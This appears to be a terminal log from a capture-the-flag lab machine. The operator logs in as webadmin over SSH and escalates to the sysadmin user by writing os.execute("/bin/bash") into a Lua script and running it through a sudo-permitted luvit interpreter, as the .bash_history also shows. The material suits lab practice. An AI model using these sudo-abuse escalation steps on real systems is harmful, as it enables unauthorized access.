allenwest1@debian:~/Desktop$ ssh -i id_rsa webadmin@10.10.10.181
#################################
-------- OWNED BY XH4H  ---------
- I guess stuff could have been configured better ^^ -
#################################
Enter passphrase for key 'id_rsa': 

Welcome to Xh4H land 



Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings

Last login: Wed Apr  8 20:37:07 2020 from 10.10.16.94
webadmin@traceback:~$ whoami
webadmin                                                                
webadmin@traceback:~$ pwd
/home/webadmin                                                          
webadmin@traceback:~$ ls                                                
00-header  note.txt  privesc.lua  privescroot.lua  pspy64               
webadmin@traceback:~$ ls -al
total 3060                                                              
drwxr-x--- 5 webadmin sysadmin    4096 Apr  8 21:30 .                   
drwxr-xr-x 4 root     root        4096 Aug 25  2019 ..                  
-rw-rw-r-- 1 webadmin webadmin       0 Apr  8 21:22 00-header           
-rw------- 1 webadmin webadmin     423 Apr  8 12:16 .bash_history       
-rw-r--r-- 1 webadmin webadmin     220 Aug 23  2019 .bash_logout        
-rw-r--r-- 1 webadmin webadmin    3771 Aug 23  2019 .bashrc
drwx------ 2 webadmin webadmin    4096 Aug 23  2019 .cache
drwxrwxr-x 3 webadmin webadmin    4096 Aug 24  2019 .local
-rw-rw-r-- 1 webadmin webadmin       1 Aug 25  2019 .luvit_history
-rw-rw-r-- 1 sysadmin sysadmin     122 Mar 16 03:53 note.txt
-rw-rw-rw- 1 webadmin webadmin      25 Apr  8 12:14 privesc.lua
-rw-rw-r-- 1 webadmin webadmin      23 Apr  8 21:22 privescroot.lua
-rw-r--r-- 1 webadmin webadmin     807 Aug 23  2019 .profile
-rwxrwxr-x 1 webadmin webadmin 3078592 Apr  8 21:22 pspy64
drwxrwxr-x 2 webadmin webadmin    4096 Apr  8 21:14 .ssh
webadmin@traceback:~$ cat .bash_history 
ls -la
sudo -l
nano privesc.lua
sudo -u sysadmin /home/sysadmin/luvit privesc.lua 
rm privesc.lua
logout
whoami
alias ls='ls -la --color=auto'
ls
cd var
ls
cd www
ls
cd html
ls
cd /
ls
cd var
ls
cd www
ls
cd html
ls
cd /
ls
cd opt
ls
cat owned.msg
cd /
ls
cd home
ls
cd webadmin
ls
cat note.txt
cat .bash_history
sudo -l
echo 'os.execute ("/bin/bash")' >> privesc.lua
sudo -u sysadmin /home/sysadmin/luvit privesc.lua
exit
webadmin@traceback:~$ cat note.txt
- sysadmin -
I have left a tool to practice Lua.
I'm sure you know where to find it.
Contact me if you have any question.
webadmin@traceback:~$ sudo -u sysadmin /home/sysadmin/luvit privesc.lua 
sysadmin@traceback:~$ ??? This shouldn't have happened but I'll take it!
